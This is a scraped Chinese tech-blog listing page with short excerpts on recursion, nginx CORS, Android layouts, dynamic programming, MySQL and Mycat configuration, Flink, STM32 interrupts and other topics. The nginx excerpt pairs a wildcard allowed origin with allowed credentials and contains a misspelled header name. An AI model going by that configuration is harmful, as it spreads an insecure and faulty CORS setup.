1、代码简洁
2、易于理解
如在树的前/中/后序遍历中，递归的实现明显比循环简单。
缺点：
1、时间和空间的消耗比较大
递归由于是函数调用自身，而函数的调用时消耗时间和空间的，每一次函数调用，都需要在内存栈中分配空间以保存参数，返回值和临时变量，而往栈中压入和弹出数据也都需要时间，所以降低了效率。
2、重复计算
递归中又很多计算都是重复的，递归的本质时把一个问题分解成两个或多个小 问题，多个小问题存在重叠的部分，即存在重复计算，如斐波那契数列的递归实现。
3、调用栈溢出
递归可能时调用栈溢出，每次调用时都会在内存栈中分配空间，而栈空间的容量是有限的，当调用的次数太多，就可能会超出栈的容量，进而造成调用栈溢出。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/838c8ab335df283d6edbc7b252932d34/" rel="bookmark">
			nginx配置跨域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在nginx的server下面加上
server {
listen 443 ssl;
add_header 'Access-Control-Allow-Origin' '*';
add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With';
add_header 'Access-Control-Allow-Metthods' 'GET,POST,OPTIONS';
location /live {
flv_live on; #打开HTTP播放FLV直播流功能
#https-flv on;
chunked_transfer_encoding on; #支持'Transfer-Encoding: chunked'方式回复
或者
add_header 'Access-Control-Allow-Origin' '*'; #添加额外的HTTP头
add_header 'Access-Control-Allow-Credentials' 'true'; #添加额外的HTTP头
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eecad1839301b0cb0b043400c12186c6/" rel="bookmark">
			Android开发知识（二十六）强大的约束布局 - ConstraintLayout的用法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言用法相对定位语句解释运用举例 边距（Margin）语句解释 bias与居中处理语句解释 圆弧定位语句解释举例运行 View的尺寸大小语句解释 View的尺寸比例语句解释 View的最大最小尺寸语句 View链语句解释 辅助布局GuideLineGroupPlaceholderBarrier 结束语 前言 在ConstraintLayout出现之前，我们编写布局往往少不了多层嵌套，很多效果需要结合Relativelayout、LinearLayout等容器的相互嵌套来完成，虽然页面的效果实现了，但却带来很大的性能消耗，而往往还因为适配问题而带来更多的麻烦。
而ConstraintLayout神奇的地方在于，它不仅能够实现Relativelayout的相对定位，也能实现像LinearLayout一样的比例分配，而且比它们还更优秀。除此之外，ConstraintLayout还提供了很多属性和辅助类，让我们更轻松的实现布局效果。
使用ConstraintLayout之后往往能把之前嵌套好几层的布局干掉。从而大大减少了布局嵌套层次，提高了性能。
ConstraintLayout也不是个什么新鲜的东西了，google最早在16年I/O大会上就发布了这个全新的布局，而实际上据我在各个技术群上的了解，貌似实际把ConstraintLayout用在项目里的人相对较少，也可能是受项目限制，不方便重构布局。也有一部分因为不熟悉这个布局的使用，从而不敢轻易用在项目中，笔者在一开始使用这个布局的时候，就被它的灵活性惊艳到了。而且容易用以前布局的思维来用在了ConstraintLayout中，这是不可取的。所以深感ConstraintLayout需要适应一段时间后就会慢慢的适应这种布局方式，在适应后也会很不想用其它的布局了。
为此我总结了以下用法，希望能够帮助到你们，也为自己知识做一个总结。
用法 本篇文章讲解的是ConstraintLayout的基础用法，基本上ConstraintLayout的要点已经在这里了。
相对定位 语句 layout_constraintLeft_toLeftOflayout_constraintLeft_toRightOflayout_constraintTop_toTopOflayout_constraintTop_toBottomOflayout_constraintRight_toLeftOflayout_constraintRight_toRightOflayout_constraintBottom_toTopOflayout_constraintBottom_toBottomOflayout_constraintBaseline_toBaselineOflayout_constraintStart_toEndOflayout_constraintStart_toStartOflayout_constraintEnd_toStartOflayout_constraintEnd_toEndOf 解释 google为我们提供了这么多个这种xxx to yyy of 的格式，
这里的xxx就是使用这条约束语句的View的某个位置（Left、Top、Right、Bottom、Start、End、BaseLine）
这里的yyy就是被用来做锚点的View的某个位置（Left、Top、Right、Bottom、Start、End、BaseLine）
效果类似于RelativeLayout的layout_toLeftOf、layout_alignParentLeft这些。
直白的理解就是：你想这个View的哪条边去对齐另外一个View的哪一条边的时候，就可以用这个。
运用举例 举个栗子，我们写个Button A，它居中父布局（水平和垂直），然后写第二个Button B，让它处于第一个Button下方。
代码如下：
&lt;android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" &gt; &lt;Button android:id="@+id/btn1" android:layout_width="200dp" android:layout_height="200dp" android:background="@color/colorAccent" app:layout_constraintLeft_toLeftOf="parent" app:layout_constraintRight_toRightOf="parent" app:layout_constraintTop_toTopOf="parent" app:layout_constraintBottom_toBottomOf="parent" android:text="A" android:textSize="50sp" /&gt; &lt;Button android:id="@+id/btn2" android:layout_width="200dp" android:layout_height="200dp" android:background="@color/colorPrimary" app:layout_constraintTop_toBottomOf="@+id/btn1" android:text="B" android:textSize="50sp" /&gt; &lt;/android.support.constraint.ConstraintLayout&gt; 运行结果如图：
（注：如果被拿来做约束参考的View是它的父布局的话，那么就不是写id，而是写parent）
View的（Left、Top、Right、Bottom、Start、End、BaseLine）:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eecad1839301b0cb0b043400c12186c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bff5892fb9faa93e7a1d783d28740d9a/" rel="bookmark">
			动态规划2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		把握要点：动态规划问题要注意保存子问题的值，并且在过程中，不要忘记使用它
经典面试题10
题目描述： 和第九题的框架相同，机器人还是要从网格左上角到达右下角，
但是网格中添加了障碍物，障碍物用1表示
状态定义：
子状态从（0,0），（0,1），（1，0）…（m-1,n-1)的路径数
F(i,j)：从F（0,0）到F（i,j)的路径数**状态转移方程的定义：
当这个点为0：F(i,j)=F(i,j-1)+F(i-1,j)
当这个点位1:0 **状态的初始化:F(i,0)=F(o,j)={0 OR 1}返回结果:F(m-1,n-1)
注意：如果此点为障碍物，则后面点都到达不了 public class Solution { public int uniquePathsWithObstacles(int[][] obstacles) { if(obstacles==null){ return 0; } int m=obstacles.length; int n=obstacles[0].length; //用来储存每一个点的路径值 int[][] temp=new int[m][n]; //初始化，第一行，第一列的值若不为1（障碍），则到达的路径数为1 for(int i=0;i&lt;m;i++){ if(obstacles[i][0]==1){ break; }else { temp[i][0]=1; } } for(int j=0;j&lt;n;j++){ if(obstacles[0][j]==1){ break; }else { temp[0][j]=1; } } for(int i=1;i&lt;m;i++){ for (int j=1;j&lt;n;j++){ if(obstacles[i][j]==1){ //注意，此处是continue，只跳出本层循环 continue; }else { temp[i][j]=temp[i-1][j]+temp[i][j-1]; } } } return temp[m-1][n-1]; } } 经典面试题11
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bff5892fb9faa93e7a1d783d28740d9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7350d41bbd96121301bd5dc7da237ad3/" rel="bookmark">
			Failed to find valid data directory.Data Dictionary initialization failed.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用命令mysqld --console查看报错，如下：
mysqld --initialize 命令之后并没有建立data文件夹。
错误信息显示data目录没有创建，
查找小度，找到答案，
[mysql]
# 设置mysql客户端默认字符集
default-character-set=utf8
[mysqld]
#设置3306端口
port = 3306
# 设置mysql的安装目录
basedir=D:\mysql-8.0.17-winx64
# 设置mysql数据库的数据的存放目录
#datadir=D:\mysql-8.0.17-winx64 此句话注释掉就可以了！
# 允许最大连接数
max_connections=200
# 服务端使用的字符集默认为8比特编码的latin1字符集
character-set-server=utf8
# 创建新表时将使用的默认存储引擎
default-storage-engine=INNODB
如上红色那句问题就可以解决了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7efb1d29b0c74a8e2b631fb0c705d0f1/" rel="bookmark">
			【扩张卷积or空洞卷积】如何理解Dilated Convolutions(空洞卷积)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章来源：https://blog.csdn.net/alxe_made/article/details/88594550 1. 扩张卷积的提出 Multi-Scale Context Aggregation by Dilated ConvolutionsDilated Residual Networks论文笔记——CVPR 2017 Dilated Residual Networks 在图像分割领域，图像输入到CNN（典型的网络比如FCN）中，FCN先像传统的CNN那样对图像做卷积再pooling，降低图像尺寸的同时增大感受野，但是由于图像分割预测是pixel-wise的输出，所以要将pooling后较小的图像尺寸upsampling到原始的图像尺寸进行预测（upsampling一般采用deconv反卷积操作，之前的pooling操作使得每个pixel预测都能看到较大感受野信息。因此图像分割FCN中有两个关键，一个是pooling减小图像尺寸增大感受野，另一个是upsampling扩大图像尺寸。在先减小再增大尺寸的过程中，肯定有一些信息损失掉了，那么能不能设计一种新的操作，不通过pooling也能有较大的感受野看到更多的信息呢？答案就是dilated conv。
这里的话我们就主要介绍一下扩张卷积的理解，具体在图像分割或者语音合成、机器翻译应用暂时不做考虑。
2. 理解的难点 其实上来就给出这个图，确实有点不知所云，有几个问题需要我们回答：
3. 感受野 在理解上面这个公式之前，我们先理解一下感受野这个含义。
参考：
1.A guide to receptive field arithmetic for Convolutional Neural Networks
2.你知道如何计算CNN感受野吗？这里有一份详细指南
然后看完之后我们才可以进行下面的内容，我们截取其中重要的图进行说明：
４. 计算空洞卷积感受野 空洞卷积就是在传统的卷积中加入了一个dilation rate这个系数。可以从两个方面理解这个参数，从原图像层面理解：就是我们对原图以(dilation rate-1)进行间隔采样；从卷积核自身的角度来看，我们相当于在未使用空洞卷积的卷积核中，在其内部插入(dilation rate-1)个０，可以理解为使用空洞卷积之后我们卷积核的尺寸变大了。后面的公式推导中，我们按照后面一种理解进行讲述。
下图是空洞卷积的动态示意图：
Dilated Convolution with a 3 x 3 kernel and dilation rate 2
4.1 从一个简单的一维例子出发 为了更好理解空洞卷积，我们从一维入手:
a: 卷积核大小是３,然后移动的步长是２，padding是１
b: 卷积核大小是３，移动的步长是１，padding是１
c.卷积核大小是３，移动的步长是１，dilation rate是2
然后我们着重对比b和c两张图，考虑亮黄色的神经元，我们在b中视野（感受野）只有2-4，也就是只有3；在c图中我们的视野变成了1-5，也就是感受野变成了5，增加了感受野了。那么为什么感受野变成了5？
我们可以这样理解，从b到c图，我们仅仅是使用了空洞卷积，按照上面对空洞卷积第二层理解也就是从卷积核的角度出发，我们相当于在kernel size内部每隔一个卷积核插入(dilation rate - 1)个0，共插入(kernel-1)次。再加上原始的卷积核的感受野，可以这样计算：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7efb1d29b0c74a8e2b631fb0c705d0f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/890e3c4116333f9e775de75bf2ccb99d/" rel="bookmark">
			纠正：Android RecyclerView滚动到指定位置并置顶（滚动方法、移动置顶、定位滑动到指定位置item）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近博主发现让RecyclerView滑动到某一位置并置顶的博客一大堆，抄的是完全一模一样。此外，虽然这些博客“解决”了这些问题，但这种解决方案过于浅显、粗暴，甚至都违背了开发思想。遂在此纠正这种错误。
RecyclerView提供了几种移动的方法
scrollToPosition
scrollTo
scrollBy
smoothScrollBy
smoothScrollToPosition
由于多数博客鱼龙混杂，本博客如果让你非常满意或解决了大家的根本性问题，希望多多支持在下方点赞和回复一下，举手之劳方便大家。
虽然里面有移动到指定位置的方法scrollToPosition（直接闪现至某一位位置）、smoothScrollToPosition（惯性滑动至某一位置）但是貌似都不尽人意，因为他们只保证能够展示出来，并不能保证在第一位。而此时如果你打开源码就会发现，原来全都是调用的LayoutManager移动方法，首先打开我们耳熟能详的LinearLayoutManager惊喜就在眼前
scrollToPosition
在scrollToPosition旁边有木有一个很像的方法
@Override
public void scrollToPosition(int position) {
mPendingScrollPosition = position;
mPendingScrollPositionOffset = INVALID_OFFSET;
if (mPendingSavedState != null) {
mPendingSavedState.invalidateAnchor();
}
requestLayout();
}
public void scrollToPositionWithOffset(int position, int offset) {
mPendingScrollPosition = position;
mPendingScrollPositionOffset = offset;
if (mPendingSavedState != null) {
mPendingSavedState.invalidateAnchor();
}
requestLayout();
}
当看到offset时也许就会明白：没错，这个就是item移动后相对父控件的偏移值，传入0就会有你想要的
smoothScrollToPosition
@Override
public void smoothScrollToPosition(RecyclerView recyclerView, RecyclerView.State state,
int position) {
LinearSmoothScroller linearSmoothScroller =
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/890e3c4116333f9e775de75bf2ccb99d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/013ed80a91d0cda81c92554d0a4fab07/" rel="bookmark">
			react学习输出一（搭建本地开发环境）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习react的开始，先来搭建一下本地开发环境
1、升级node.js（如果你的版本高。忽略此步）
注意：node &gt;= 8.10 和 npm &gt;= 5.6，如果node版本过低，安装无法成功（本人亲测，会删除创建的项目）
方法：windows环境下找到原来安装的路径，去官网下载更高版本的安装包，重新按步骤安装一遍，覆盖原来安装路径即可。
node -v 查看版本是否更新
2、打开你要安装项目的路径，执行 npx creat-react-app my-app
3、安装完毕后，cd my-app（打开项目路径），执行npm start启动即可。
4、浏览器打开http://localhost:3000查看，就可以写代码了。
这里自己对比了下之前用的vue-cli2.x版本，发现他们都依赖node环境，但react可能要求版本更高。
另外vue-cli2需要npm install所需模块（nodemodules），而react执行npx creat-react-app my-app后已经安装完毕。
至于命令大同小异，vue-cli3版本现在是什么样，还没研究。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59c3ed59490342a9ab7d39f2c332b341/" rel="bookmark">
			用JAVA写的21点游戏（BlackJack）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用JAVA写的21点游戏 此程序是大学期间Java课程的期末设计。扑克牌去除大小王共52张牌，有4种花色，每种花色有13张牌。有庄家和玩家，庄家有他的游戏规则，具体看游戏介绍。 CardRank类：此类为枚举类，枚举扑克牌13个点数。分别是A，2，3，4，5，6，7，8，9，10，J，Q，K。
public enum CardRank { //枚举所有出现的点数 Ace("A"),Two("2"),Three("3"),Four("4"),Five("5"),Six("6"), Seven("7"),Eight("8"),Nine("9"),Ten("10"),Jack("J"),Queen("Q"),King("K"); //构造方法 private CardRank(String Num) { this.Num=Num; } //定义变量 private String Num; public String getNum(){ return Num; } public void setNum(String Num) { this.Num=Num; } } CardColor类：此类也是枚举类，枚举扑克牌的4种花色，分别是红桃Heart("\u2663")，
方块Diamond("\u2666")，梅花Club("\u2665")，黑桃Black("\u2660")。
public enum CardColor { //枚举所有牌可能出现的颜色 Heart("\u2663"),Diamond("\u2666"),Club("\u2665"),Black("\u2660"); private CardColor(String Color) { this.Color=Color; } private String Color; public String getColor() { return Color; } public void setColor(String Color) { this.Color=Color; } } Card类：一张扑克牌，有花色和点数两个属性。
public class Card { private String flower;	//花色 private String num;	//点数 public Card() { // TODO Auto-generated constructor stub } //带参数的构造方法 public Card(String flower,String num) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59c3ed59490342a9ab7d39f2c332b341/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa683e9898adf076f83b642e19aa32e2/" rel="bookmark">
			Mycat配置读写分离：server.xml和shema.xml配置参数含义说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		schema.xml:
&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt; &lt;mycat:schema xmlns:mycat="http://io.mycat/"&gt; &lt;schema name="jtdb" checkSQLschema="false" sqlMaxLimit="100" dataNode="jtdb"&gt;&lt;/schema&gt; &lt;!--定义节点名称/节点主机/数据名称--&gt; &lt;dataNode name="jtdb" dataHost="localhost1" database="jtdb" /&gt; &lt;!--参数介绍--&gt; &lt;!--balance 0表示所有的读操作都会发往writeHost主机 1表示所有的度操作发往readHost和闲置的主节点中--&gt; &lt;!--writeType=0 所有的写操作都发往第一个writeHost主机	writeType=1 所有的写操作随机发往writeHost中--&gt; &lt;!--dbType 表示数据库类型 mysql/oracle--&gt; &lt;!--dbDriver="native" 固定参数 不变--&gt; &lt;!--switchType=-1 表示不自动切换, 主机宕机后不会自动切换从节点--&gt; &lt;!--switchType=1 表示会自动切换(默认值)如果第一个主节点宕机后,Mycat会进行3次心跳检测,如果3次都没有响应,则会自动切换到第二个主节点--&gt; &lt;!--并且会更新/conf/dnindex.properties文件的主节点信息 localhost1=0 表示第一个节点.该文件不要随意修改否则会出现大问题--&gt; &lt;dataHost name="localhost1" maxCon="1000" minCon="10" balance="1" writeType="0" dbType="mysql" dbDriver="native" switchType="1" slaveThreshold="100"&gt; &lt;heartbeat&gt;select 1&lt;/heartbeat&gt; &lt;!--配置第一台主机主要进行写库操作，在默认情况下Mycat主要操作第一台主机，在第一台主机中已经实现了读写分离，因为默认写操作会发往 读的操作默认发往，如果节点比较忙，则主节点分担部分压力 --&gt; &lt;writeHost host="hostM1" url="192.168.238.130:3306" user="root" password="951003"&gt; &lt;readHost host="hostS1" url="192.168.238.131:3306" user="root" password="951003" /&gt; &lt;/writeHost&gt; &lt;writeHost host="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa683e9898adf076f83b642e19aa32e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10702906c0d1a38d90e50570b644c02e/" rel="bookmark">
			fgets 函数用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来说一说fgets(..)函数。
原型 char * fgets(char * s, int n,FILE *stream);
参数：
s: 字符型指针，指向存储读入数据的缓冲区的地址。
n: 从流中读入n-1个字符
stream ： 指向读取的流。
返回值：
1. 当n&lt;=0 时返回NULL，即空指针。
2. 当n=1 时，返回空串"".
3. 如果读入成功，则返回缓冲区的地址。
4. 如果读入错误或遇到文件结尾(EOF)，则返回NULL.
看看这个函数的官方说明：
/*** *char *fgets(string, count, stream) - input string from a stream * *Purpose: * get a string, up to count-1 chars or '\n', whichever comes first, * append '\0' and put the whole thing into string. the '\n' IS included * in the string.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10702906c0d1a38d90e50570b644c02e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c33e73c6abf8668743a61b39d7824e30/" rel="bookmark">
			Flink state,checkpoint详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
目录
背景
（1）介绍，实现方式分类
（2） 使用Manage State，Flink自动实现state保存和恢复
（3） 自定义state 自行实现实现checkpoint接口
借鉴文章
背景
Flink相对于Storm和Spark Stream比较大的一个优势就是State，pipline中可以保存状态，这对于解决业务是有巨大的帮助，否则将需要借助三方工具来时间状态的存储和访问。
正文 State
什么是State(状态)？
某task/operator在某时刻的一个中间结果
快照(shapshot)
在flink中状态可以理解为一种数据结构
举例
对输入源为&lt;key,value&gt;的数据,计算其中某key的最大值，如果使用HashMap，也可以进行计算，但是每次都需要重新遍历，使用状态的话，可以获取最近的一次计算结果，减少了系统的计算次数
程序一旦crash，恢复
程序扩容
State类型
总的来说，state分为两种，operator state和key state，key state专门对keystream使用，所包含的Sate种类也更多，可理解为dataStream.keyBy()之后的Operator State,Operator State是对每一个Operator的状态进行记录，而key State则是在dataSteam进行keyBy()后，记录相同keyId的keyStream上的状态key State提供的数据类型：ValueState&lt;T&gt;、ListState&lt;T&gt;、ReducingState&lt;T&gt;、MapState&lt;T&gt;。
operator state种类只有一种就是ListState&lt;T&gt; ，flink官方文档用kafka的消费者举例，认为kafka消费者的partitionId和offset类似flink的operator state
State理解
state分为operator state和key state两种，都属于manage state，优势是可以结合checkpoint，实现自动存储状态和异常恢复功能，但是state不一定要使用manage state，在source、windows和sink中自己声明一个int都可以作为状态进行使用，只不过需要自己实现快照状态保存和恢复。
State实战
import org.apache.flink.api.common.functions.RichFlatMapFunction;
import org.apache.flink.api.common.state.ValueState;
import org.apache.flink.api.common.state.ValueStateDescriptor;
import org.apache.flink.api.common.typeinfo.TypeHint;
import org.apache.flink.api.common.typeinfo.TypeInformation;
import org.apache.flink.api.java.tuple.Tuple2;
import org.apache.flink.configuration.Configuration;
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;
import org.apache.flink.util.Collector;
/**
* Created by authoe on 2018/9/12.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c33e73c6abf8668743a61b39d7824e30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4991b3c405c0e483e0df3f228e462047/" rel="bookmark">
			Python字典数据在循环当中删除元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在Python当中遍历字典值删除符合要求的字典元素，如果采用如下的代码：
for key in wordDict.keys(): if wordDict[key]&lt;80: del wordDict[key] 那么会触发RuntimeError: dictionary changed size during iteration错误，正确的用法是
for key in list(wordDict.keys()): if wordDict[key]&lt;80: del wordDict[key] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d76a2a9ec31c8df1a8c39dbb5036e34/" rel="bookmark">
			stm中断优先级理解&#43;抢占优先级和相应优先级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、抢占优先级比子优先级的优先权更高，这意味抢占优先级更高的中断会先执行，而不管子优先级的优先权，数值越低优先级越高。
二、同理，如果抢占优先级相同，那么就会比较子优先级，子优先级更高的中断将会先被执行，数值越低优先级越高。
三、当两个中断源的抢占式优先级相同时，这两个中断将没有嵌套关系，当一个中断到来后，如果正在处理另一个中断，这个后到来的中断就要等到前一个中断处理完之后才能被处理。如果这两个中断同时到达，则中断控制器根据他们的响应优先级高低来决定先处理哪一个；如果他们的抢占式优先级和响应优先级都相等，则根据他们在中断表中的排位顺序决定先处理哪一个。
四、既然每个中断源都需要被指定这两种优先级，就需要有相应的寄存器位记录每个中断的优先级；在Cortex-M3中定义了8个比特位用于设置中断源的优先级，这8个比特位可以有8种分配方式，如下：
所有8位用于指定响应优先级
最高1位用于指定抢占式优先级，最低7位用于指定响应优先级
最高2位用于指定抢占式优先级，最低6位用于指定响应优先级
最高3位用于指定抢占式优先级，最低5位用于指定响应优先级
最高4位用于指定抢占式优先级，最低4位用于指定响应优先级
最高5位用于指定抢占式优先级，最低3位用于指定响应优先级
最高6位用于指定抢占式优先级，最低2位用于指定响应优先级
最高7位用于指定抢占式优先级，最低1位用于指定响应优先级
这就是优先级分组的概念。
========================================================================
五、Cortex-M3允许具有较少中断源时使用较少的寄存器位指定中断源的优先级，因此STM32把指定中断优先级的寄存器位减少到4位，这4个寄存器位的分组方式如下：
第0组：所有4位用于指定响应优先级
第1组：最高1位用于指定抢占式优先级，最低3位用于指定响应优先级
第2组：最高2位用于指定抢占式优先级，最低2位用于指定响应优先级
第3组：最高3位用于指定抢占式优先级，最低1位用于指定响应优先级
第4组：所有4位用于指定抢占式优先级
可以通过调用STM32的固件库中的函数NVIC_PriorityGroupConfig()选择使用哪种优先级分组方式，这个函数的参数有下列5种：
NVIC_PriorityGroup_0 =&gt; 选择第0组
NVIC_PriorityGroup_1 =&gt; 选择第1组
NVIC_PriorityGroup_2 =&gt; 选择第2组
NVIC_PriorityGroup_3 =&gt; 选择第3组
NVIC_PriorityGroup_4 =&gt; 选择第4组
接下来就是指定中断源的优先级，下面以一个简单的例子说明如何指定中断源的抢占式优先级和响应优先级：
// 选择使用优先级分组第1组 NVIC_PriorityGroupConfig(NVIC_PriorityGroup_1); // 使能EXTI0中断 NVIC_InitStructure.NVIC_IRQChannel = EXTI0_IRQChannel; NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 1; // 指定抢占式优先级别1 NVIC_InitStructure.NVIC_IRQChannelSubPriority = 0; // 指定响应优先级别0 NVIC_InitStructure.NVIC_IRQChannelCmd = ENABLE; NVIC_Init(&amp;NVIC_InitStructure); // 使能EXTI9_5中断 NVIC_InitStructure.NVIC_IRQChannel = EXTI9_5_IRQChannel; NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 0; // 指定抢占式优先级别0 NVIC_InitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d76a2a9ec31c8df1a8c39dbb5036e34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02634ba9d951646d9b11ce3108d9eb6e/" rel="bookmark">
			pytorch 下载mnist 下载不了 的解决办法  改下载网址即可
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自博客原址：https://blog.csdn.net/york1996/article/details/81780065
但是呢，很多人已经从外国的网站下载过了，你再下载它们共享的资源就可以下载成功，接下来你可以手工的把下载好的数据集放到恰当的位置。你可能以为是万事大吉了，但是它会报错：
RuntimeError: Dataset not found. You can use download=True to download it
这是为什么呢？我们取看他的源代码（按住ctrl，然后点击相应的函数）如下图：
就可以看到源代码了，代码中还要对数据进行进一步处理，你的下载的文件不是它直接拿来用的，最后要处理成.pt文件，所以直接把数据集放在指定文件夹是不可行的。你可能想到把数据进行处理的代码拿出来，然后处理我们已经下载好的数据就可以了，我也这样尝试了，但是也会assertion报错，我就没有继续进行，而是采用了下面的简便的方案。
首先问题的根本原因就在于从外国网站下载数据很慢，这个时候。那么你可以把自己电脑上已经下载好的数据集的文件路径放到浏览器的窗口，然后转到这个地址，就可以得到如下：
然后把源代码中的网址替换成本地的文件地址就可以了，如下所示：
替换
urls = [ 'http://yann.lecun.com/exdb/mnist/train-images-idx3-ubyte.gz', 'http://yann.lecun.com/exdb/mnist/train-labels-idx1-ubyte.gz', 'http://yann.lecun.com/exdb/mnist/t10k-images-idx3-ubyte.gz', 'http://yann.lecun.com/exdb/mnist/t10k-labels-idx1-ubyte.gz', ] 成为
urls = [ 'file:///E:/programing/python/StudyPytorch/StudyPytorch/mnist/train-images-idx3-ubyte.gz', 'file:///E:/programing/python/StudyPytorch/StudyPytorch/mnist/train-labels-idx1-ubyte.gz', 'file:///E:/programing/python/StudyPytorch/StudyPytorch/mnist/t10k-images-idx3-ubyte.gz', 'file:///E:/programing/python/StudyPytorch/StudyPytorch/mnist/t10k-labels-idx1-ubyte.gz', ] 下面是正常运行的结果（路径和前面不一样不要大惊小怪，因为我又用其他路径做了一次）：
其他的框架或者数据集也可以采用相似的办法来解决！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8afe79806843f367b10a7d66a5f40bc3/" rel="bookmark">
			谷歌浏览器调用activex控件方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文转自 https://jingyan.baidu.com/article/af9f5a2d0ebe5543140a4596.html
activex是由微软开发，所以在支持上，目前原生态支持的只有IE，其他浏览器想要支持activex, 需要额外做一些设置或安装补丁包，比如谷歌浏览器就需要安装 IE-Tab-Multi-(Enhance)_v1.0.2.1.crx 转载于:https://www.cnblogs.com/happykoukou/p/11216911.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32537a03b1642b7e79f96e7e9ef1d2ac/" rel="bookmark">
			kalman 滤波
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卡尔曼(Kalman)滤波算法原理、C语言实现及实际应用
文章目录
卡尔曼滤波
一、滤波效果展示
二、简介
三、组成
预测状态方程
（1）目的：
（2）方程：
（3）备注预测协方差方程
（1）目的
（2）方程
（3）备注卡尔曼增益方程
（1）目的
（2）方程
（3）备注跟新最优值方程（卡尔曼滤波的输出）
（1）目的
（2）方程
（3）备注更新协方差方程
（1）目的
（2）方程
（3）备注
四、C 程序代码实现参数列表代码实现（一维数据滤波） 作者：Beyonderwei
来源：CSDN
原文：https://blog.csdn.net/CSDN_X_W/article/details/90289021
版权声明：本文为博主原创文章，转载请附上博文链接！
卡尔曼滤波
一、滤波效果展示
蓝色的波形是实际测得的数据，红色的波形是经 Kalman 滤波后的数据波形。
注：这里是实际应用激光测距传感器（TOF）vl53l0x 测得的距离数据。
f
二、简介
采用递归的方法解决线性滤波问题，只需要当前的测量值和前一个采样周期的估计值就能进行状态估计，需要的存储空间小，每一步的计算量小。
三、组成
预测状态方程 （1）目的：
由 系统状态变量k-1时刻的最优值 和 系统输入 计算出k时刻的 系统预测值。
（2）方程：
3）备注
①. 当X为一维数据时，Fk的值是1。
卡尔曼增益方程 （1）目的
根据（k时刻） 协方差矩阵的预测值 计算 卡尔曼增益。
（2）方程
3）备注
①. 当 Pk|k-1 为一个一维矩阵时，Hk 是1。
跟新最优值方程（卡尔曼滤波的输出） （1）目的
根据 状态变量的预测值 和 系统测量值 计算出 k时刻状态变量的最优值。
	</div>
	<div class="list__footer clearfix">
